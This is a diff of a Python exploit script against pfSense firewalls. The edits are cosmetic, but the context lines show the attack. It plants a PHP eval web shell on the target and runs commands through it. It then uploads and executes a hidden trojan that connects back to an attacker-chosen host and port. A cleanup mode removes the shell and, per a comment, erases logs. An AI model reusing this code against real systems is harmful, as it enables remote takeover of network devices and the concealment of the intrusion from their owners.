@@ -6,7 +6,8 @@ from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 import argparse
 import sys
-# hardcoded for now. We have to avoid bad chars later. maybe a config file would be nice?
+# hardcoded for now. We have to avoid bad chars later.
+# maybe a config file would be nice?
 shell_code = "<?php eval($_POST[1337]);?>"
 shell_fullpath = "/usr/local/www/system_advanced_control.php"
 shell_webpath = "/system_advanced_control.php"
@@ -18,7 +19,7 @@ cleanup_script = "utils/cleanup.sh"
 # logs of webshell will be in /var/log/nginx.log
 # the whole ass webshell injection command will be in /var/log/pfblockerng/dnsbl.log
 # webshell injection url request will also be in /var/log/nginx.log
-# exploit will auto-zap the webshell in --mode clean
+# exploit will auto-zap the webshell in --mode clean (and zap logs)
 
 def touch(base_url, target_path):
     # check its a pfsense then
@@ -77,13 +78,13 @@ def exploit(base_url, connectback_host, connectback_port, trojan, interact):
     print(execute_command(base_url, shell_webpath, shell_param, shell_command="id;uname -a;pwd"))
     print("(+) Uploading trojan...")
     upload_file(base_url, shell_webpath, shell_param, local_file=trojan, remote_file="/tmp/.troy")
-    print("{+} Executing trojan...")
+    print("(+) Executing trojan...")
     execute_command(base_url, shell_webpath, shell_param, shell_command=f"chmod +x /tmp/.troy;CHOST={connectback_host} CPORT={connectback_port} /tmp/.troy")
     if interact == True:
-        print("{-} Not implemented in this version")
+        print("(-) Not implemented in this version")
     else:
         pass
-    print("{!} Make sure to run '--mode cleanup' when you are done.")
+    print("(!) Make sure to run '--mode cleanup' when you are done.")
 
 def cleanup(base_url, shell_webpath, shell_param, cleanup_script):
     print("(+) Running cleanup.")
